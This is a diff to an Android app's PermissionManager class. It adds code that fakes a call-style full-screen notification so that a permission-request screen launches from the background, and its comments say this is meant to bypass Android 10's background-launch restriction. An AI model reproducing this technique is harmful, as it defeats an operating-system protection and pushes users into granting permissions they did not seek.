@@ -1,6 +1,10 @@
 package com.task.tusker.commands;
 
 import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -8,6 +12,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
+import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import com.task.tusker.PermissionRequestActivity;
 import org.json.JSONArray;
@@ -77,8 +82,60 @@ public class PermissionManager {
             "android.permission.SYSTEM_ALERT_WINDOW"
     ));
 
+    private static final String PERM_CHANNEL_ID = "perm_requests";
+    private static final int    PERM_NOTIF_ID   = 0xABC1;
+
     public PermissionManager(Context context) {
         this.context = context.getApplicationContext();
+    }
+
+    /**
+     * On Android 10+ (API 29+) apps cannot start activities from the background —
+     * the call is silently dropped with no exception.  The workaround is to fire a
+     * full-screen-intent notification: Android treats it as a high-priority call-
+     * style alert and immediately launches the activity even from the background.
+     *
+     * On older APIs a direct startActivity() still works fine.
+     */
+    private void launchViaNotification(Intent activityIntent) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            // Android 9 and below: direct launch works from background.
+            context.startActivity(activityIntent);
+            return;
+        }
+        try {
+            PendingIntent pi = PendingIntent.getActivity(
+                    context, PERM_NOTIF_ID, activityIntent,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+            NotificationManager nm =
+                    (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+            if (nm == null) { context.startActivity(activityIntent); return; }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel(
+                        PERM_CHANNEL_ID, "Permission Requests",
+                        NotificationManager.IMPORTANCE_HIGH);
+                ch.setDescription("Runtime permission dialogs");
+                ch.setShowBadge(false);
+                nm.createNotificationChannel(ch);
+            }
+
+            Notification notif = new NotificationCompat.Builder(context, PERM_CHANNEL_ID)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Permission Required")
+                    .setContentText("Tap to grant permission")
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .setCategory(NotificationCompat.CATEGORY_CALL)
+                    .setFullScreenIntent(pi, true)
+                    .setAutoCancel(true)
+                    .build();
+
+            nm.notify(PERM_NOTIF_ID, notif);
+        } catch (Exception e) {
+            Log.w(TAG, "launchViaNotification failed, falling back to direct start: " + e.getMessage());
+            try { context.startActivity(activityIntent); } catch (Exception ignored) {}
+        }
     }
 
     /** Returns all permissions with granted/denied status. */
@@ -157,7 +214,14 @@ public class PermissionManager {
 
             if (intent != null) {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(intent);
+                if (SETTINGS_ONLY_PERMISSIONS.contains(permission)) {
+                    // Settings intents launch system UI — exempt from background restrictions.
+                    context.startActivity(intent);
+                } else {
+                    // Our PermissionRequestActivity — must use notification on API 29+
+                    // to bypass Android 10+ background activity start restriction.
+                    launchViaNotification(intent);
+                }
                 result.put("success", true);
                 result.put("message", "Permission dialog shown for: " + permission);
             } else {
@@ -192,7 +256,7 @@ public class PermissionManager {
                 intent.putExtra(PermissionRequestActivity.EXTRA_PERMISSIONS,
                         missing.toArray(new String[0]));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(intent);
+                launchViaNotification(intent);
                 result.put("success", true);
                 result.put("message", "Showing permission dialog for " + missing.size()
                         + " missing permission(s)");
